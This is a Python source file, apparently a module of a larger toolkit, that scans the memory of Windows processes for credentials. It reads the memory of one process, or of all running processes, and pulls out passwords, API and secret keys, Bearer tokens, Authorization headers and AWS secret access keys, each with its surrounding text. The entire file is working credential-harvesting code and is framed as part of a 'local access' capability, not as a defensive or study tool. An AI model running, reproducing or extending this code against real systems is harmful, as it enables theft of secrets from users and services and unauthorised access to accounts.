"""
Live process memory inspector for T's local access module.
Reads arbitrary process memory by PID, searches for credential patterns.
Requires admin rights (helper.py context).
Windows-only via ReadProcessMemory.
"""

import ctypes
import ctypes.wintypes as wt
import re
import sys
from core.logger import get_logger

log = get_logger("local_access.memory_inspector")

# Maximum total bytes to read per process to avoid runaway reads
_MAX_READ_BYTES = 256 * 1024 * 1024   # 256 MB

# Predefined patterns — all return named-group "val" for uniform extraction
_DEFAULT_PATTERNS: list[re.Pattern] = [
    re.compile(rb'(?:password|passwd|pwd)\s{0,4}[:=]\s{0,4}([\x20-\x7e]{6,64})',  re.IGNORECASE),
    re.compile(rb'(?:api[_-]?key|secret[_-]?key)\s{0,4}[:=]\s{0,4}([\x20-\x7e]{8,64})', re.IGNORECASE),
    re.compile(rb'Bearer\s+([\x21-\x7e]{20,200})',                                 re.IGNORECASE),
    re.compile(rb'Authorization:\s+([\x21-\x7e]{10,200})',                          re.IGNORECASE),
    re.compile(rb'token\s{0,4}[:=]\s{0,4}([\x21-\x7e]{20,200})',                  re.IGNORECASE),
    re.compile(rb'AWS_SECRET_ACCESS_KEY\s{0,4}[:=]\s{0,4}([\x21-\x7e]{20,60})',   re.IGNORECASE),
]


class MemoryInspector:

    def inspect_process(
        self, pid: int, extra_patterns: list[str] | None = None
    ) -> dict:
        """
        Read a process's memory and search for credential patterns.
        Returns {pid, process_name, hits: [{pattern, value, context}], error}.
        """
        result = {"pid": pid, "process_name": "unknown", "hits": [], "error": None}

        if sys.platform != "win32":
            result["error"] = "Memory inspection requires Windows"
            return result

        patterns = list(_DEFAULT_PATTERNS)
        for p in (extra_patterns or []):
            try:
                patterns.append(re.compile(p.encode(), re.IGNORECASE))
            except re.error:
                pass

        kernel32 = ctypes.windll.kernel32

        # Get process name
        try:
            import psutil
            result["process_name"] = psutil.Process(pid).name()
        except Exception:
            pass

        # Open process
        PROCESS_VM_READ           = 0x0010
        PROCESS_QUERY_INFORMATION = 0x0400
        h = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
        if not h:
            result["error"] = f"Could not open process {pid} — access denied or PID not found"
            return result

        try:
            hits   = []
            seen   = set()
            total  = 0
            base   = 0

            MEM_COMMIT = 0x1000
            PAGE_GUARD = 0x100

            class MBI(ctypes.Structure):
                _fields_ = [
                    ("BaseAddress",       ctypes.c_void_p),
                    ("AllocationBase",    ctypes.c_void_p),
                    ("AllocationProtect", wt.DWORD),
                    ("RegionSize",        ctypes.c_size_t),
                    ("State",             wt.DWORD),
                    ("Protect",           wt.DWORD),
                    ("Type",              wt.DWORD),
                ]

            mbi  = MBI()
            read = ctypes.c_size_t(0)

            while base < 0x7FFFFFFFFFFF and total < _MAX_READ_BYTES:
                ret = kernel32.VirtualQueryEx(
                    h, ctypes.c_void_p(base), ctypes.byref(mbi), ctypes.sizeof(mbi)
                )
                if not ret:
                    break

                region_size = mbi.RegionSize or 4096
                if (
                    mbi.State == MEM_COMMIT and
                    mbi.Protect and
                    not (mbi.Protect & PAGE_GUARD) and
                    region_size < 32 * 1024 * 1024
                ):
                    buf = ctypes.create_string_buffer(region_size)
                    if kernel32.ReadProcessMemory(
                        h, ctypes.c_void_p(base), buf, region_size, ctypes.byref(read)
                    ):
                        chunk = bytes(buf[: read.value])
                        total += len(chunk)
                        for pat in patterns:
                            for m in pat.finditer(chunk):
                                val = m.group(1).decode("ascii", errors="replace").strip()
                                if val and val not in seen and len(val) >= 4:
                                    seen.add(val)
                                    start   = max(0, m.start() - 40)
                                    end     = min(len(chunk), m.end() + 40)
                                    context = chunk[start:end].decode("ascii", errors="replace")
                                    context = re.sub(r'[^\x20-\x7e]', '.', context)
                                    hits.append({
                                        "pattern": pat.pattern.decode("ascii", errors="replace"),
                                        "value":   val,
                                        "context": context.strip(),
                                    })
                                    if len(hits) >= 200:   # cap per process
                                        break
                        if len(hits) >= 200:
                            break

                base += region_size

            result["hits"] = hits
        finally:
            kernel32.CloseHandle(h)

        return result

    def search_all_processes(self, extra_patterns: list[str] | None = None) -> list[dict]:
        """
        Run inspect_process across all running processes.
        Skips System (PID 0/4) and protected processes gracefully.
        Returns list of results that have at least one hit.
        """
        if sys.platform != "win32":
            return [{"error": "Memory inspection requires Windows"}]

        try:
            import psutil
            pids = [p.pid for p in psutil.process_iter() if p.pid not in (0, 4)]
        except Exception as e:
            return [{"error": f"Could not enumerate processes: {e}"}]

        results = []
        for pid in pids:
            r = self.inspect_process(pid, extra_patterns)
            if r.get("hits"):
                results.append(r)

        return results
